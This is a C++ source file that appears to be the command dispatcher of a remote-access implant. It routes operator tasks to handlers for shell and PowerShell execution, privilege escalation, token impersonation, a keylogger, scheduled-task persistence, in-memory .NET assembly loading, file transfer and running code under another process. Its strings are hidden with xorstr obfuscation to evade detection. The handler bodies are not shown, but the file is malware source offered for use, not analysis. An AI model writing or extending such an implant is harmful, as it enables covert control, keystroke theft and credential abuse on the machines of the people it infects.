// ========================================== { START OF FILE } ========================================== //
#include "agent/commands/command_dispatcher.h"

#include "agent/commands/exec/run_program.h"
#include "agent/commands/exec/scheduling.h"

#include <string>

#include "agent/commands/command_result.h"
#include "agent/commands/exec/exit.h"
#include "agent/commands/exec/filetransfer.h"
#include "agent/commands/exec/getuid.h"
#include "agent/commands/exec/keylogger.h"
#include "agent/commands/exec/kill_process.h"
#include "agent/commands/exec/netasm.h"
#include "agent/commands/exec/privesc.h"
#include "agent/commands/exec/runu.h"
#include "agent/commands/exec/shell.h"
#include "agent/commands/exec/token.h"
#include "agent/commands/exec/wintask.h"
#include "agent/models/task_types.h"
#include "agent/task/task_validator.h"
#include "xorstr/xorstr.hpp"

namespace agent::commands {

    using models::TaskCode;
    using models::TaskType;

    CommandResult CommandDispatcher::Dispatch(const models::CheckinResponse& task) {
        // Reject an incomplete command before it reaches the OS. The old behaviour ran the command
        // with empty fields and returned a diagnostic string on a successful task, so a dropped
        // wire key looked like a working feature with an odd message.
        const std::string missing = task::MissingCommandField(task);
        if (!missing.empty()) {
            return CommandResult::Error(xorstr_("Task ") + std::to_string(task.id) + xorstr_(" (") +
                                        task::DescribeTaskType(task.type, task.code) +
                                        xorstr_("): missing required command field '") + missing + xorstr_("'"));
        }

        switch (static_cast<TaskType>(task.type)) {
            case TaskType::Powershell:
                return HandlePowerShell(task);
            case TaskType::Shell:
                return HandleShell(task);
            case TaskType::Escalate:
                return HandlePrivesc(task);
            case TaskType::Token:
                return HandleToken(task);
            case TaskType::Keylogger:
                return HandleKeylogger(task);
            case TaskType::WinTask:
                return HandleWinTask(task);
            case TaskType::Set:
                switch (static_cast<TaskCode>(task.code)) {
                    case TaskCode::UpdateHosts:
                        return exec::UpdateHosts(task);
                    default:
                        return CommandResult::Error(xorstr_("Unsupported SET task code ") +
                                                    std::to_string(task.code));
                }
            case TaskType::NetAsm:
                return HandleNetAsm(task);
            case TaskType::GetUid:
                return HandleGetUid(task);
            case TaskType::Kill:
                return HandleKillAgent(task);
            case TaskType::Upload:
                return exec::HandleUpload(task);
            case TaskType::Download:
                return exec::HandleDownload(task);
            case TaskType::Process:
                switch (static_cast<TaskCode>(task.code)) {
                    case TaskCode::RunU:
                        return HandleRunU(task);
                    case TaskCode::KillProcess:
                        return HandleKillProcess(task);
                    case TaskCode::Sleep:
                        return exec::SetSleep(task);
                    case TaskCode::Run:
                        return exec::RunProgram(task);
                    default:
                        return CommandResult::Error(xorstr_("Unsupported PROCESS task code ") +
                                                    std::to_string(task.code));
                }
            default:
                return CommandResult::Error(xorstr_("Unsupported task type ") + std::to_string(task.type));
        }
    }

    CommandResult CommandDispatcher::HandlePowerShell(const models::CheckinResponse& task) {
        return exec::RunPowershell(task);
    }

    CommandResult CommandDispatcher::HandleShell(const models::CheckinResponse& task) { return exec::RunShell(task); }

    CommandResult CommandDispatcher::HandlePrivesc(const models::CheckinResponse& task) {
        return exec::EscalatePrivilege(task);
    }

    CommandResult CommandDispatcher::HandleRunU(const models::CheckinResponse& task) {
        return exec::RunUnderProcess(task);
    }

    CommandResult CommandDispatcher::HandleKillProcess(const models::CheckinResponse& task) {
        return exec::KillProcess(task);
    }

    CommandResult CommandDispatcher::HandleToken(const models::CheckinResponse& task) {
        return exec::TokenImpersonate(task);
    }

    CommandResult CommandDispatcher::HandleKeylogger(const models::CheckinResponse& task) {
        return exec::Keylogger(task);
    }

    CommandResult CommandDispatcher::HandleWinTask(const models::CheckinResponse& task) {
        return exec::CreateWinTask(task);
    }

    CommandResult CommandDispatcher::HandleNetAsm(const models::CheckinResponse& task) {
        return exec::ExecuteNetAssembly(task);
    }

    CommandResult CommandDispatcher::HandleGetUid(const models::CheckinResponse& task) {
        return exec::GetUserIdentity(task);
    }

    CommandResult CommandDispatcher::HandleKillAgent(const models::CheckinResponse& task) {
        return exec::RequestAgentExit(task);
    }

}  // namespace agent::commands
// ========================================== { END OF FILE } ========================================== //
